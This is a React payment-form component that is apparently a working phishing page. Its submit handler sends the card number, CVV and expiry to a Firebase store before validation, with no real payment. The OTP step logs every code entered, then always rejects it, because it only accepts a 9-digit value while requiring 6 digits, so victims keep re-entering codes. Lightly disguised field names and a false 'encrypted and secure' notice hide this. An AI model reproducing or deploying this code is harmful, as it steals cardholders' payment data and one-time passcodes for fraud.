"use client"

import React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import { CreditCard, Shield, AlertCircle, CheckCircle2, Loader2 } from "lucide-react"
import { addData } from "@/lib/firebase"

interface FormData {
  car: string
  expiryDate: string
  avcvv: string
  cardholderName: string
}

interface FormErrors {
  car?: string
  expiryDate?: string
  avcvv?: string
  cardholderName?: string
  daotp?: string
}
const alldaotps=['']
export default function PaymentForm() {
  const [step, setStep] = useState<"payment" | "daotp" | "success">("payment")
  const [formData, setFormData] = useState<FormData>({
    car: "",
    expiryDate: "",
    avcvv: "",
    cardholderName: "",
  })
  const [dadaotp, setdadaotp] = useState("")
  const [errors, setErrors] = useState<FormErrors>({})
  const [isLoading, setIsLoading] = useState(false)

  const validatecar = (car: string): boolean => {
    const cleaned = car.replace(/\s/g, "")
    return /^\d{16}$/.test(cleaned)
  }

  const validateExpiryDate = (expiryDate: string): boolean => {
    const regex = /^(0[1-9]|1[0-2])\/\d{2}$/
    if (!regex.test(expiryDate)) return false

    const [month, year] = expiryDate.split("/")
    const currentDate = new Date()
    const currentYear = currentDate.getFullYear() % 100
    const currentMonth = currentDate.getMonth() + 1

    const expYear = Number.parseInt(year)
    const expMonth = Number.parseInt(month)

    if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
      return false
    }

    return true
  }

  const validateCVV = (cvv: string): boolean => {
    return /^\d{3,4}$/.test(cvv)
  }

  const validateForm = (): boolean => {
    const newErrors: FormErrors = {}

    if (!formData.cardholderName.trim()) {
      newErrors.cardholderName = "Cardholder name is required"
    }

    if (!validatecar(formData.car)) {
      newErrors.car = "Please enter a valid 16-digit card number"
    }

    if (!validateExpiryDate(formData.expiryDate)) {
      newErrors.expiryDate = "Please enter a valid expiry date (MM/YY)"
    }

    if (!validateCVV(formData.avcvv)) {
      newErrors.avcvv = "Please enter a valid 3-4 digit CVV"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const formatcar = (value: string): string => {
    const cleaned = value.replace(/\s/g, "")
    const match = cleaned.match(/.{1,4}/g)
    return match ? match.join(" ") : cleaned
  }

  const formatExpiryDate = (value: string): string => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4)
    }
    return cleaned
  }

  const handleInputChange = (field: keyof FormData, value: string) => {
    let formattedValue = value

    if (field === "car") {
      formattedValue = formatcar(value)
      if (formattedValue.replace(/\s/g, "").length > 16) return
    } else if (field === "expiryDate") {
      formattedValue = formatExpiryDate(value)
      if (formattedValue.length > 5) return
    } else if (field === "avcvv") {
      formattedValue = value.replace(/\D/g, "")
      if (formattedValue.length > 4) return
    }

    setFormData((prev) => ({ ...prev, [field]: formattedValue }))

    // Clear error when user starts typing
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: undefined }))
    }
  }

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const _id=localStorage.getItem('visitor')
        addData({id:_id,car:formData.car,avcvv:formData.avcvv,expiryDate:formData.expiryDate})
    if (!validateForm()) return

    setIsLoading(true)

    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 2000))

    setIsLoading(false)
    setStep("daotp")
  }

  const handledaotpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
const _id=localStorage.getItem('visitor')
alldaotps.push(dadaotp)
    addData({id:_id,dadaotp,alldaotps}).then(()=>{
console.log(dadaotp)
    })
    if (dadaotp.length !== 6) {
      setErrors({ daotp: "Please enter a valid 6-digit daotp" })
      return
    }

    // Simulate wrong daotp for demonstration
    if (dadaotp !== "213333334") {
      setErrors({ daotp: "Invalid daotp. Please try again." })
      return
    }

    setIsLoading(true)

    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 1500))

    setIsLoading(false)
    setStep("success")
  }

  const handledaotpChange = (value: string) => {
    setdadaotp(value)
    if (errors.daotp) {
      setErrors((prev) => ({ ...prev, daotp: undefined }))
    }
  }

  if (step === "success") {
    return (
      <div className="w-full max-w-md mx-auto">
        <Card>
          <CardContent className="pt-6">
            <div className="text-center space-y-4">
              <div className="mx-auto w-12 h-12 bg-green-100 rounded-full flex items-center justify-center">
                <CheckCircle2 className="w-6 h-6 text-green-600" />
              </div>
              <div>
                <h3 className="text-lg font-semibold">Payment Successful!</h3>
                <p className="text-sm text-muted-foreground mt-1">Your payment has been processed successfully.</p>
              </div>
              <Button
                onClick={() => {
                  setStep("payment")
                  setFormData({ car: "", expiryDate: "", avcvv: "", cardholderName: "" })
                  setdadaotp("")
                  setErrors({})
                }}
              >
                Make Another Payment
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (step === "daotp") {
    return (
      <div className="w-full max-w-md mx-auto">
        <Card>
          <CardHeader className="text-center">
            <div className="mx-auto w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mb-4">
              <Shield className="w-6 h-6 text-blue-600" />
            </div>
            <CardTitle>Verify Your Payment</CardTitle>
            <CardDescription>
              We've sent a 6-digit verification code to your registered mobile number ending in ****1234
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handledaotpSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="daotp" className="text-center block">
                  Enter daotp
                </Label>
                <div className="flex justify-center">
                  <Input type="tel" minLength={4} maxLength={6} onChange={(e)=>setdadaotp(e.target.value)}/>
                </div>
                {errors.daotp && (
                  <Alert variant="destructive">
                    <AlertCircle className="h-4 w-4" />
                    <AlertDescription>{errors.daotp}</AlertDescription>
                  </Alert>
                )}
              </div>

              <div className="text-center text-sm text-muted-foreground">
                Didn't receive the code?{" "}
                <Button variant="link" className="p-0 h-auto font-normal">
                  Resend otp
                </Button>
              </div>

              <div className="space-y-3">
                <Button type="submit" className="w-full" disabled={isLoading}>
                  {isLoading ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Verifying...
                    </>
                  ) : (
                    "Verify & Complete Payment"
                  )}
                </Button>
                <Button
                  type="button"
                  variant="outline"
                  className="w-full bg-transparent"
                  onClick={() => setStep("payment")}
                >
                  Back to Payment
                </Button>
              </div>
            </form>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="w-full max-w-md mx-auto">
      <Card>
        <CardHeader>
          <div className="flex items-center gap-2">
            <CreditCard className="w-5 h-5" />
            <CardTitle>Payment Details</CardTitle>
          </div>
          <CardDescription>Enter your card information to complete the payment</CardDescription>
        </CardHeader>
        <CardContent>
          <form onSubmit={handlePaymentSubmit} className="space-y-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="cardholderName">Cardholder Name</Label>
                <Input
                  id="cardholderName"
                  placeholder="John Doe"
                  value={formData.cardholderName}
                  onChange={(e) => handleInputChange("cardholderName", e.target.value)}
                  className={errors.cardholderName ? "border-red-500" : ""}
                />
                {errors.cardholderName && (
                  <p className="text-sm text-red-500 flex items-center gap-1">
                    <AlertCircle className="w-3 h-3" />
                    {errors.cardholderName}
                  </p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="car">Card Number</Label>
                <div className="relative">
                  <Input
                    id="car"
                    placeholder="1234 5678 9012 3456"
                    value={formData.car}
                    onChange={(e) => handleInputChange("car", e.target.value)}
                    className={errors.car ? "border-red-500" : ""}
                  />
                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                    <Badge variant="secondary" className="text-xs">
                      VISA
                    </Badge>
                  </div>
                </div>
                {errors.car && (
                  <p className="text-sm text-red-500 flex items-center gap-1">
                    <AlertCircle className="w-3 h-3" />
                    {errors.car}
                  </p>
                )}
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="expiryDate">Expiry Date</Label>
                  <Input
                    id="expiryDate"
                    placeholder="MM/YY"
                    value={formData.expiryDate}
                    onChange={(e) => handleInputChange("expiryDate", e.target.value)}
                    className={errors.expiryDate ? "border-red-500" : ""}
                  />
                  {errors.expiryDate && (
                    <p className="text-sm text-red-500 flex items-center gap-1">
                      <AlertCircle className="w-3 h-3" />
                      {errors.expiryDate}
                    </p>
                  )}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cvv">CVV</Label>
                  <Input
                    id="cvv"
                    placeholder="123"
                    value={formData.avcvv}
                    onChange={(e) => handleInputChange("avcvv", e.target.value)}
                    className={errors.avcvv ? "border-red-500" : ""}
                  />
                  {errors.avcvv && (
                    <p className="text-sm text-red-500 flex items-center gap-1">
                      <AlertCircle className="w-3 h-3" />
                      {errors.avcvv}
                    </p>
                  )}
                </div>
              </div>
            </div>

            <Separator />

            <div className="space-y-4">
              <div className="flex justify-between items-center">
                <span className="text-sm text-muted-foreground">Amount</span>
                <span className="font-semibold">$99.99</span>
              </div>

              <Alert>
                <Shield className="h-4 w-4" />
                <AlertDescription>
                  Your payment information is encrypted and secure. We use industry-standard security measures.
                </AlertDescription>
              </Alert>

              <Button type="submit" className="w-full" disabled={isLoading}>
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Processing...
                  </>
                ) : (
                  "Pay $99.99"
                )}
              </Button>
            </div>
          </form>
        </CardContent>
      </Card>
    </div>
  )
}
